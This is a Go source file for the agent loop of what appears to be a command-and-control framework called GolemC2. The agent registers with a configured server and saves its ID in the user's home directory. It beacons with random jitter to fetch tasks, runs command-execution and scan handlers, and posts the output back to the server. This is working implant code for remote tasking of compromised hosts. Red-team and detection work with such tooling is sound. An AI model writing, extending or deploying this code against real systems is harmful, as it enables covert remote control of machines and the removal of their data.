package agent

import (
	"bytes"
	"encoding/json"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/DUDLEYDANIEL/GolemC2/internal/agent/tasks"
	"github.com/DUDLEYDANIEL/GolemC2/internal/common"
	"github.com/DUDLEYDANIEL/GolemC2/pkg/logging"
)

type Result struct {
    TaskID    string    `json:"task_id"`
    Output    string    `json:"output"`
    ExitCode  int       `json:"exit_code"`
    Completed time.Time `json:"completed"`
}
// handlers maps task types to their handlers
var handlers = map[string]tasks.TaskHandler{
	"execute": &tasks.ExecuteHandler{},
	"scan":    &tasks.ScanHandler{},
}

// CoreLoop runs the agent's main loop, managing agentID and task execution
func CoreLoop(cfg *common.Config, client *http.Client) {
	rand.Seed(time.Now().UnixNano())

	// Load or register agentID
	agentID := loadAgentID()
	if agentID == "" {
		resp, err := client.Post(cfg.ServerUrl+"/register", "application/json", bytes.NewReader([]byte{}))
		if err != nil {
			logging.Log.Errorf("Registration failed: %v", err)
			return
		}
		defer resp.Body.Close()

		if resp.StatusCode != http.StatusOK {
			logging.Log.Errorf("Registration failed with status: %d", resp.StatusCode)
			return
		}

		var regResp map[string]string
		if err := json.NewDecoder(resp.Body).Decode(&regResp); err != nil {
			logging.Log.Errorf("Decode registration failed: %v", err)
			return
		}
		agentID = regResp["agent_id"]
		if agentID == "" {
			logging.Log.Errorf("Empty agent_id received")
			return
		}
		saveAgentID(agentID)
	}

	// Main task loop
	for {
		resp, err := client.Get(cfg.ServerUrl + "/tasks?agent_id=" + agentID)
		if err != nil {
			logging.Log.Errorf("Task fetch failed: %v", err)
			time.Sleep(cfg.BeaconInterval)
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode != http.StatusOK {
			logging.Log.Errorf("Task fetch failed with status: %d", resp.StatusCode)
			time.Sleep(cfg.BeaconInterval)
			continue
		}

		var tasks []tasks.Task
		if err := json.NewDecoder(resp.Body).Decode(&tasks); err != nil {
			logging.Log.Errorf("Task decode failed: %v", err)
			time.Sleep(cfg.BeaconInterval)
			continue
		}

		for _, t := range tasks {
			h := handlers[t.Type]
			if h == nil {
				logging.Log.Errorf("No handler for task type: %s", t.Type)
				continue
			}
			out, code := h.Run(t.Params)
			res := Result{TaskID: t.ID, Output: out, ExitCode: code, Completed: time.Now()}
			b, err := json.Marshal(res)
			if err != nil {
				logging.Log.Errorf("Result marshal failed: %v", err)
				continue
			}

			resp, err := client.Post(cfg.ServerUrl+"/results?agent_id="+agentID, "application/json", bytes.NewReader(b))
			if err != nil {
				logging.Log.Errorf("Result post failed: %v", err)
				continue
			}
			resp.Body.Close()
		}

		jitter := time.Duration(rand.Int63n(int64(cfg.BeaconJitter))) * time.Second
		time.Sleep(cfg.BeaconInterval + jitter)
	}
}

// loadAgentID reads the agent ID from a file in the user's home directory
func loadAgentID() string {
	home, err := os.UserHomeDir()
	if err != nil {
		logging.Log.Errorf("Failed to get home directory: %v", err)
		return ""
	}
	path := filepath.Join(home, ".agent_id")
	data, err := os.ReadFile(path)
	if err != nil {
		if !os.IsNotExist(err) {
			logging.Log.Errorf("Failed to read agent ID file: %v", err)
		}
		return ""
	}
	return strings.TrimSpace(string(data))
}

// saveAgentID writes the agent ID to a file in the user's home directory
func saveAgentID(agentID string) {
	home, err := os.UserHomeDir()
	if err != nil {
		logging.Log.Errorf("Failed to get home directory: %v", err)
		return
	}
	path := filepath.Join(home, ".agent_id")
	err = os.WriteFile(path, []byte(agentID), 0600)
	if err != nil {
		logging.Log.Errorf("Failed to write agent ID file: %v", err)
	}
}